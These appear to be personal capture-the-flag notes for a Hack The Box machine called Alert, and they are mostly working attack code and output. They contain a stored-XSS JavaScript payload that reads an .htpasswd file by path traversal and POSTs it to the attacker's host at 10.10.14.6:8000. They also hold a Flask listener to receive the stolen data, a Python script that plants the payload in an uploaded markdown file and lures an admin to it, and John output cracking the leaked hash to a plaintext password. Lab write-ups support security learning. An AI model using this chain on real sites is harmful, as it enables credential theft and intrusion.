# Alerts

ports:

22, 80


dns => statistics.alert.htb (requires authorization)

fuzzing => messages.php

afetr upload a file, the page visualizer.php show the markdown content and get a link share
http://alert.htb/visualizer.php?link_share=6742caf1caf786.48612401.md

## attempting xss

nc -nvlp 80

```javascript
fetch("/messages.php?file=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%76%61%72%2f%77%77%77%2f%73%74%61%74%69%73%74%69%63%73%2e%61%6c%65%72%74%2e%68%74%62%2f%2e%68%74%70%61%73%73%77%64")
  .then(response => response.text())
  .then(data => {
    console.log("Fetched data:", data);
    fetch("http://10.10.14.6:8000", {
      method: "POST",
      headers: {
        "Content-Type": "text/plain"
      },
      body: data
    });
    return data;
  });
```

flask server
```python
#!/usr/bin/python3


from flask import Flask, request


app = Flask(__name__)


@app.route("/", methods=["GET", "POST"])
def hackthur():

    if request.method == "POST":
        data = request.data.decode("utf-8")
        print(f"received data {data}")
        # return "Data received", 200
        response = app.response_class("")
        response.headers["Access-Control-Allow-Origin"] = "*"
        response.headers["Access-Control-Allow-Methods"] = "POST, OPTIONS"
        response.headers["Access-Control-Allow-Headers"] = "Content-Type"
        return response
    elif request.method == "GET":
        print(f"received {data} GET")
        return "GET", 200
    else:
        return "Listtening for POST request", 200




if __name__ == "__main__":
	app.run("0.0.0.0", port=8000)

```


the exploit 

```python
#!/usr/bin/python

import requests
import re
import base64

with open("./script.js") as payload:
    content = payload.read()
base64_content = base64.b64encode(content.encode()).decode()
file = ("# hello, world\n"
        "hello world\n"
        "<img onerror=\"eval(atob('{}'))\" src=\"/\">".format(base64_content))

post_files = {"file": ("test.md", file, "text/markdown")}
post_url = "http://alert.htb/visualizer.php"
post_resp = requests.post(post_url, files=post_files)
sharing_url = re.findall("http://alert.htb/.*\\.md", post_resp.text)

print("sharing_url: {}".format(sharing_url[0]))

contact_url = "http://alert.htb/contact.php"
contact_data = {"email": "a@a.a", "message": sharing_url}
contact_resp = requests.post(contact_url, data=contact_data)
if contact_resp.ok:
    print("Success")
else:
    print("Failed")

```
the hashcode

</pre>                                                         
                                                               
10.10.11.44 - - [26/Nov/2024 23:27:31] "POST / HTTP/1.1" 200 - 
received data <pre>albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
</pre>                                                         
                                                               

using john

```bash
❯ john --wordlist=/opt/SecLists/rockyou.txt hash
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:01:45 DONE (2024-11-26 23:33) 0g/s 133359p/s 133359c/s 133359C/s  edizzle69..*7¡Vamos!
Session completed. 
❯ john --wordlist=/opt/SecLists/rockyou.txt hash --format=md5crypt-long
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
manchesterunited (albert)     
1g 0:00:00:00 DONE (2024-11-26 23:33) 9.090g/s 25600p/s 25600c/s 25600C/s meagan..medicina
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```